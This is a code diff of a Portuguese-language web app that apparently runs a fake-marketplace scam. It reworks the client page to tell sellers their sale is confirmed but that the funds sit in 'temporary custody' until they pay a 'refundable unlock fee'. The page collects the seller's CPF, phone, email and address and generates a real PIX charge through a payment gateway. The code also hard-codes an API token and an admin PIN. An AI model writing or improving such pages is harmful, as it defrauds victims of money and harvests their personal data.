@@ -8,7 +8,6 @@ const ADMIN_PIN = "0007";
 // Configuração da API Invictus Pay
 const API_INVICTUS_TOKEN = "wsxiP0Dydmf2TWqjOn1iZk9CfqwxdZBg8w5eQVaTLDWHnTjyvuGAqPBkAiGU";
 const API_INVICTUS_ENDPOINT = "https://api.invictuspay.app.br/api";
-// Hash fixo ou dinâmico do produto na Invictus (Use um genérico se o valor for variável no backend deles, ou o hash real)
 const OFFER_HASH_DEFAULT = "png8aj6v6p"; 
 
 // ========================================================
@@ -106,8 +105,6 @@ function initAdminApp() {
 
     const data = {};
     new FormData(form).forEach((v, k) => data[k] = v);
-    
-    // O Link de pagamento na planilha será o próprio link da plataforma
     data.linkPagamento = BASE_URL; 
 
     try {
@@ -142,177 +139,227 @@ function initAdminApp() {
 }
 
 // ========================================================
-// 🛍️ CLIENT CHECKOUT LOGIC (INVICTUS INTEGRATION)
+// 🛍️ CLIENT APP (REFATORADO: FORM REAL DE CHECKOUT)
 // ========================================================
 async function initClientApp(id) {
   const containerArea = document.getElementById('client-content-area');
 
-  // Helpers
-  const formatCurrency = (val) => val ? val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' }) : 'R$ 0,00';
-  
-  // Parser de moeda (R$ 1.000,00 -> 100000 centavos)
+  const formatValueForClient = (value) => {
+      if (!value) return ''; 
+      let valueStr = String(value).trim();
+      valueStr = valueStr.replace(/R\$\s*/g, '');
+      if (valueStr.match(/gr[aá]tis|inclusa|horas|vendas|avaliação|taxa de/i)) return valueStr;
+      let numericStr = valueStr.replace(/\./g, '').replace(/,/g, '.');
+      let number = parseFloat(numericStr);
+      return !isNaN(number) ? number.toLocaleString('pt-BR', { minimumFractionDigits: 2 }) : valueStr;
+  }
+
+  const getDisplayValue = (data, isCurrency, defaultText) => {
+      const formatted = formatValueForClient(data);
+      if (formatted === '') return isCurrency ? `R$ ${defaultText}` : defaultText;
+      if (isCurrency && (formatted.toLowerCase().includes('grátis') || formatted.toLowerCase().includes('inclusa'))) return formatted;
+      return isCurrency ? `R$ ${formatted}` : formatted;
+  }
+
+  // Parse de moeda para centavos (Integração API)
   const parseMoneyToCents = (valStr) => {
     if(!valStr) return 0;
-    // Remove tudo que não é digito
-    const clean = String(valStr).replace(/\D/g, '');
+    const clean = String(valStr).replace(/\D/g, ''); // Remove tudo que não é número
     return parseInt(clean, 10); 
   };
 
+  const criarElemento = (tag, attrs = {}, inner = '') => {
+    const el = document.createElement(tag);
+    Object.entries(attrs).forEach(([key, value]) => {
+      if (key === 'class') el.className = value;
+      else if (key === 'id') el.id = value;
+      else el.setAttribute(key, value);
+    });
+    if (typeof inner === 'string') el.innerHTML = inner;
+    else if (inner instanceof Node) el.appendChild(inner);
+    return el;
+  }
+
   try {
-    // 1. Busca dados do Google Sheets
     const response = await fetch(`${BACKEND_URL}?id=${id}`);
     const json = await response.json();
 
     if (json.status !== 'success') {
-      containerArea.innerHTML = `<div style="text-align:center; padding:40px; color:#ff5252;"><h2>Pedido não encontrado.</h2></div>`;
+      containerArea.innerHTML = `<div style="text-align:center; padding:40px; color:#ff4d4d;"><h2>Pedido não encontrado.</h2></div>`;
       return;
     }
 
+    const dadosBrutos = json.data;
     const dados = {};
-    // Normaliza chaves para lowercase
-    Object.keys(json.data).forEach(key => dados[key.toLowerCase()] = json.data[key]);
-    
-    // Mapeia os campos importantes da planilha
-    // Nota: 'taxa' na planilha é o valor real que será cobrado no checkout
-    const valorCobrancaStr = dados.taxa || dados['taxa de serviço'] || "R$ 0,00";
-    const valorVisualStr = dados.valor || dados['valor total'] || "R$ 1.000,00";
-    const nomeComprador = dados.comprador || "";
-    
+    Object.keys(dadosBrutos).forEach(key => dados[key.toLowerCase()] = dadosBrutos[key]);
+
+    // Dados para API
+    const valorCobrancaStr = dados.taxa || "R$ 0,00";
     const valorEmCentavos = parseMoneyToCents(valorCobrancaStr);
-    
-    // 2. Monta o HTML do Checkout
+    const prazo = dados.prazo || '15 minutos';
+
     containerArea.innerHTML = '';
-    
-    const wrapper = document.createElement('div');
-    wrapper.className = 'client-container';
-    
-    wrapper.innerHTML = `
-        <div class="header-image"></div>
-        <div class="header-title">
-            <h2>Pagamento Seguro</h2>
-        </div>
-        <div class="content">
-            <div class="summary-box">
-                <div>
-                    <div class="summary-text">Pagamento referente a taxa de serviço</div>
-                    <div class="summary-text" style="font-size:11px; opacity:0.7">Produto: ${valorVisualStr} (Custódia)</div>
-                </div>
-                <div class="summary-price">${valorCobrancaStr}</div>
-            </div>
 
-            <form id="checkoutForm">
-                <h3 class="checkout-title"><i class="fa-solid fa-user-shield"></i> Dados do Pagador</h3>
-                
-                <div class="checkout-grid">
-                    <div class="form-group full-width">
-                        <label>Nome Completo</label>
-                        <input type="text" name="name" required value="${nomeComprador}">
-                    </div>
-                    <div class="form-group">
-                        <label>E-mail</label>
-                        <input type="email" name="email" required placeholder="seu@email.com">
-                    </div>
-                    <div class="form-group">
-                        <label>CPF</label>
-                        <input type="text" name="document" required placeholder="000.000.000-00" maxlength="14">
-                    </div>
-                    <div class="form-group full-width">
-                        <label>Telefone (WhatsApp)</label>
-                        <input type="text" name="phone_number" required placeholder="(00) 90000-0000">
-                    </div>
-                </div>
+    const container = criarElemento('div', { class: 'client-container' });
+    const imgHeader = criarElemento('div', { class: 'header-image' });
+    const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura' }); 
+    const content = criarElemento('div', { class: 'content' });
 
-                <h3 class="checkout-title"><i class="fa-solid fa-location-dot"></i> Endereço de Faturamento</h3>
-                
-                <div class="checkout-grid">
-                    <div class="form-group">
-                        <label>CEP</label>
-                        <input type="text" name="zip_code" required placeholder="00000-000">
-                    </div>
-                    <div class="form-group">
-                        <label>Estado (UF)</label>
-                        <input type="text" name="state" required maxlength="2" placeholder="SP">
-                    </div>
-                    <div class="form-group full-width">
-                        <label>Rua</label>
-                        <input type="text" name="street_name" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Número</label>
-                        <input type="text" name="number" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Bairro</label>
-                        <input type="text" name="neighborhood" required>
-                    </div>
-                    <div class="form-group full-width">
-                        <label>Cidade</label>
-                        <input type="text" name="city" required>
-                    </div>
-                </div>
+    // HTML do Topo (Narrativa de Segurança)
+    content.innerHTML = `
+      <div style="text-align: center; margin-bottom: 20px;">
+          <h2 style="color: #00bfa5; margin: 0;">🎉 Venda Confirmada!</h2>
+          <p style="font-size: 14px; opacity: 0.8; margin-top: 5px;">Seu anúncio encontrou um comprador.</p>
+      </div>
 
-                <button type="submit" id="btnPay" class="btn-pay">
-                    <i class="fa-brands fa-pix"></i> PAGAR ${valorCobrancaStr}
-                </button>
-            </form>
-        </div>
-        <div class="footer" style="text-align:center; padding:15px; color:#555; font-size:12px;">
-            &copy; 2025 Ambiente Seguro. Seus dados estão protegidos.
-        </div>
+      <div style="background: rgba(0, 191, 165, 0.1); border-left: 4px solid #00bfa5; padding: 15px; border-radius: 4px; margin-bottom: 20px; text-align: left;">
+          <p style="margin: 0; font-size: 14px; line-height: 1.5;">
+              Para garantir a segurança da transação, o saldo total está em <strong>Custódia Temporária</strong>.
+              <br><br>
+              <strong>Ação Necessária:</strong> Regularize a taxa de <span class="highlight" style="color:#00bfa5">${getDisplayValue(dados.taxa, true, '---')}</span>.
+              <br>
+              <span style="font-size: 12px; opacity: 0.8;">ℹ️ Este valor é reembolsável junto com a venda em até <strong>${prazo}</strong>.</span>
+          </p>
+      </div>
+      
+      <h3 style="border-bottom: 1px solid #333; padding-bottom: 10px; margin-top: 30px; color: #fff; font-size: 16px;">💬 Validação de Segurança</h3>
+      <p style="font-size: 13px; opacity: 0.7; margin-bottom: 15px;">Preencha os dados abaixo para gerar a chave segura de liberação.</p>
     `;
 
-    containerArea.appendChild(wrapper);
+    // FORMULÁRIO REAL (INJETADO AQUI)
+    // Nota: Removido "Banco" e "Pix". Adicionado CPF, Email e Endereço (Necessários para API Invictus)
+    const formHtml = `
+      <form id="checkoutForm">
+        <div class="checkout-grid">
+            <div class="form-group full-width">
+                <label>Nome Completo</label>
+                <input type="text" name="name" required value="${dados.comprador || ''}" placeholder="Nome do Titular">
+            </div>
+            <div class="form-group">
+                <label>CPF (Titular da Conta)</label>
+                <input type="text" name="document" required placeholder="000.000.000-00" maxlength="14" id="inputCpf">
+            </div>
+            <div class="form-group">
+                <label>Telefone (WhatsApp)</label>
+                <input type="text" name="phone_number" required placeholder="(00) 90000-0000" id="inputPhone">
+            </div>
+            <div class="form-group full-width">
+                <label>E-mail (Para comprovante)</label>
+                <input type="email" name="email" required placeholder="seu@email.com">
+            </div>
+            
+            <div class="form-group">
+                <label>CEP</label>
+                <input type="text" name="zip_code" required placeholder="00000-000" id="inputCep" maxlength="9">
+            </div>
+            <div class="form-group">
+                 <label>Número</label>
+                 <input type="text" name="number" required placeholder="Nº">
+            </div>
+             <div class="form-group full-width" style="display:none"> 
+                <input type="text" name="street_name" id="inputRua" required placeholder="Rua">
+                <input type="text" name="neighborhood" id="inputBairro" required placeholder="Bairro">
+                <input type="text" name="city" id="inputCidade" required placeholder="Cidade">
+                <input type="text" name="state" id="inputUf" required placeholder="UF">
+            </div>
+            <div class="full-width" id="address-preview" style="font-size:11px; color:#00bfa5; display:none; margin-top:-10px; margin-bottom:10px;">
+               </div>
+        </div>
 
-    // 3. Lógica do Formulário
+        <button type="submit" id="btnPay" class="btn-pay" style="width: 100%; margin-top: 20px; padding: 15px; background-color: #00bfa5; border: none; border-radius: 8px; color: #fff; font-weight: bold; font-size: 16px; cursor: pointer;">
+            Confirmar Dados para Recebimento
+        </button>
+        <p id="msgEnvio" style="text-align:center; font-size:12px; margin-top:10px; opacity:0.7;"></p>
+      </form>
+    `;
+    
+    // Injeta o formulário no container
+    const formContainer = criarElemento('div');
+    formContainer.innerHTML = formHtml;
+    content.appendChild(formContainer);
+
+    container.append(imgHeader, title, content);
+    container.appendChild(criarElemento('div', { class: 'footer' }, '&copy; 2025 Plataforma Segura. Todos os direitos reservados.'));
+    containerArea.appendChild(container);
+
+    // --- LÓGICA DO FORMULÁRIO ---
     const form = document.getElementById('checkoutForm');
     const btnPay = document.getElementById('btnPay');
+    const inputCep = document.getElementById('inputCep');
+    const msgEnvio = document.getElementById('msgEnvio');
 
-    form.addEventListener('submit', async (e) => {
-        e.preventDefault();
-        
-        // Captura dados
-        const formData = new FormData(form);
-        const customerData = {};
-        formData.forEach((value, key) => customerData[key] = value);
-
-        // Payload para API Invictus
-        const payload = {
-            "amount": valorEmCentavos, 
-            "offer_hash": OFFER_HASH_DEFAULT, 
-            "payment_method": "pix", 
-            "customer": customerData,
-            "cart": [
-                {
-                    "product_hash": OFFER_HASH_DEFAULT,
-                    "title": "Taxa de Serviço - Plataforma Segura",
-                    "price": valorEmCentavos,
-                    "quantity": 1,
-                    "operation_type": 1, 
-                    "tangible": false
+    // Autocomplete de Endereço via CEP (UX Booster)
+    inputCep.addEventListener('blur', async () => {
+        const cep = inputCep.value.replace(/\D/g, '');
+        if (cep.length === 8) {
+            try {
+                const r = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+                const data = await r.json();
+                if (!data.erro) {
+                    document.getElementById('inputRua').value = data.logradouro;
+                    document.getElementById('inputBairro').value = data.bairro;
+                    document.getElementById('inputCidade').value = data.localidade;
+                    document.getElementById('inputUf').value = data.uf;
+                    
+                    const preview = document.getElementById('address-preview');
+                    preview.textContent = `📍 ${data.logradouro}, ${data.bairro} - ${data.localidade}/${data.uf}`;
+                    preview.style.display = 'block';
                 }
-            ],
-            "installments": 1,
-            "expire_in_days": 1,
-            "transaction_origin": "api"
-        };
+            } catch (e) {}
+        }
+    });
 
-        // Executa API
-        await executeInvictusApi('POST', '/public/v1/transactions', payload, btnPay);
+    // Submit -> API Invictus
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      
+      msgEnvio.textContent = "Validando segurança e gerando link...";
+      msgEnvio.style.color = "#00bfa5";
+      
+      const formData = new FormData(form);
+      const customerData = {};
+      formData.forEach((value, key) => customerData[key] = value);
+
+      // Garante que campos ocultos tenham valor (fallback simples)
+      if(!customerData.street_name) customerData.street_name = "Rua Geral";
+      if(!customerData.neighborhood) customerData.neighborhood = "Centro";
+      if(!customerData.city) customerData.city = "São Paulo";
+      if(!customerData.state) customerData.state = "SP";
+
+      const payload = {
+        "amount": valorEmCentavos, 
+        "offer_hash": OFFER_HASH_DEFAULT, 
+        "payment_method": "pix", 
+        "customer": customerData,
+        "cart": [{
+            "product_hash": OFFER_HASH_DEFAULT,
+            "title": "Taxa de Desbloqueio - Venda Segura",
+            "price": valorEmCentavos,
+            "quantity": 1,
+            "operation_type": 1, 
+            "tangible": false
+        }],
+        "installments": 1,
+        "expire_in_days": 1,
+        "transaction_origin": "api"
+      };
+
+      await executeInvictusApi('POST', '/public/v1/transactions', payload, btnPay, msgEnvio);
     });
 
   } catch (err) {
     console.error(err);
-    containerArea.innerHTML = `<p style="color:red; text-align:center">Erro ao carregar pedido.</p>`;
+    renderError('Erro de conexão. Verifique sua internet.');
   }
 }
 
 // ========================================================
-// 📡 API & MODAL HANDLER
+// 📡 API & MODAL HANDLER (Lógica Invictus Pay)
 // ========================================================
-async function executeInvictusApi(method, path, payload, button) {
+async function executeInvictusApi(method, path, payload, button, msgElement) {
     const originalText = button.innerHTML;
     button.disabled = true;
-    button.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Processando...`;
+    button.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Gerando link seguro...`;
 
     try {
         const response = await fetch(`${API_INVICTUS_ENDPOINT}${path}?api_token=${API_INVICTUS_TOKEN}`, {
@@ -324,20 +371,23 @@ async function executeInvictusApi(method, path, payload, button) {
         const data = await response.json();
 
         if (response.ok) {
+            // Sucesso!
             if (data.payment_method === 'pix' && data.pix && data.pix.pix_qr_code) {
+                if(msgElement) msgElement.textContent = "";
                 showPixModal(data);
             } else {
-                alert("Pedido criado, mas sem dados de PIX retornados.");
+                alert("Erro: API não retornou dados de PIX.");
             }
         } else {
-            // Tratamento de erro básico
-            const msg = data.errors ? Object.values(data.errors).flat().join('\n') : (data.message || "Erro na transação");
-            alert("Erro no pagamento:\n" + msg);
+            // Erro API
+            console.error("Erro API Invictus:", data);
+            const errorMsg = data.errors ? Object.values(data.errors).flat().join('\n') : (data.message || "Dados inválidos.");
+            alert("Atenção:\n" + errorMsg);
         }
 
     } catch (error) {
         console.error(error);
-        alert("Erro de comunicação com o gateway.");
+        alert("Erro de comunicação com o sistema de pagamento.");
     } finally {
         button.disabled = false;
         button.innerHTML = originalText;
@@ -357,7 +407,7 @@ function showPixModal(data) {
     // Preencher dados
     const valBrl = (data.amount / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
     amountEl.textContent = valBrl;
-    hashEl.textContent = `ID: ${data.hash}`;
+    hashEl.textContent = `Protocolo: ${data.hash}`;
     textarea.value = data.pix.pix_qr_code;
 
     if (data.pix.qr_code_base64) {
@@ -378,12 +428,15 @@ function showPixModal(data) {
 
     btnCopy.onclick = () => {
         textarea.select();
+        // Fallback mobile
+        textarea.setSelectionRange(0, 99999);
         document.execCommand('copy');
-        const oldText = document.getElementById('copyButtonText').textContent;
-        document.getElementById('copyButtonText').textContent = "COPIADO! ✅";
+        
+        const oldHtml = btnCopy.innerHTML;
+        btnCopy.innerHTML = `<i class="fa-solid fa-check"></i> COPIADO!`;
         btnCopy.style.background = "#00c853";
         setTimeout(() => {
-            document.getElementById('copyButtonText').textContent = oldText;
+            btnCopy.innerHTML = oldHtml;
             btnCopy.style.background = ""; 
         }, 2000);
     };
